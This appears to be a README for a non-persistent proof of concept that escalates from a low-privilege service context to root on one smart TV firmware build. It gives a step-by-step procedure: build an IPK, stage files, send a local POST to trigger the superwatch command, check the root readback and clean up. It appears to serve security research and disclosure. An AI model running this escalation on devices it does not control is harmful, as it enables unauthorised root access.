# Reversible U09.09F superwatch root probe

This directory contains the public, non-persistent proof of concept for the
privilege-boundary issue documented in the model's
[security report](../../../docs/models/58A53FEVS/V0006.09.09F.P0930/SECURITY-REPORT.md).

Use it only on a TV you own. The PoC is intentionally narrower than the
research chain:

- it installs only the fixed package `re.rootprobe`;
- the package records UID/GID, groups, capability masks and `NoNewPrivs`;
- it does not start a daemon, open a port, change firewall policy, add a boot
  service, modify a read-only partition or touch `/OAD`;
- command 54 and the package `postrm` remove the proof again;
- `swprobe.js` verifies the exact SHA-256 of the harmless IPK and accepts no
  caller-supplied command or package path.

## Target and prerequisite

Validated target:

```text
Model:    58A53FEVS_0006
Firmware: V0000.09.09F.P0930
SoC:      MediaTek MTK9602, 32-bit ARM userland
```

The starting point is code execution in the stock Phoenix service context
(UID 314, supplementary group 616), such as a function under the `basic`
package's local FaaS router. Deployment of that low-privilege function is a
separate, already documented launcher/file-bridge primitive; it is not hidden
inside this PoC.

Do not transpose command ID 53 to another firmware. The command registry is
build-specific.

## 1. Build the harmless IPK

On the development host:

```sh
python3 tools/u0909f/poc/make_root_probe.py /tmp/root-probe.ipk
sha256sum /tmp/root-probe.ipk
```

The builder is deterministic. The expected digest is:

```text
sha256:a37db332d49c8efce7da65a305ba9790d2d422fa36b30be83266359884a7fd34
```

No prebuilt IPK or vendor binary is committed.

## 2. Stage the two inputs

Using the existing, owner-controlled file deployment path, place:

```text
/tmp/root-probe.ipk
  -> /APPS/root-probe.ipk

tools/u0909f/poc/swprobe.js
  -> /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/swprobe.js
```

Both files must be readable by UID 314. The JS helper is constrained to the
fixed package and IPK path above.

## 3. Invoke and observe

Serve `invoke.html` from the owner's LAN and open it in the TV browser, or
make the equivalent TV-local POST:

```text
POST https://localhost:9888/function/basic/fetch/swprobe
Content-Type: application/json
identifier:

{"action":"install"}
```

The response includes two different evidence classes:

1. the superwatch socket reply, retained for diagnostics only;
2. the independent `PROOF` readback, which is the privilege oracle.

A successful proof contains values equivalent to:

```text
ROOT_PROBE_V1
Uid: 0 0 0 0
Gid: 0 0 0 0
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
NoNewPrivs: 0
```

Whitespace differs across `/proc` renderings. A negative reply or timeout is
not a negative result by itself; this firmware was observed returning `91:-1`
after the root `postinst` had already run. Promote the result only when the
proof file and package state agree.

## 4. Control and cleanup

Press **Remove probe** or call:

```json
{"action":"cleanup","removeHelper":true}
```

The cleanup path sends command 54 for exactly `re.rootprobe`, waits for both
the proof and opkg status entry to disappear, removes the staged IPK, and can
remove the FaaS helper itself. A clean final status reports:

```json
{"ipkPresent":false,"packagePresent":false,"proofPresent":false}
```

If the process is interrupted, rerun the cleanup action. Do not issue
concurrent opkg operations; they were observed corrupting package state during
development.
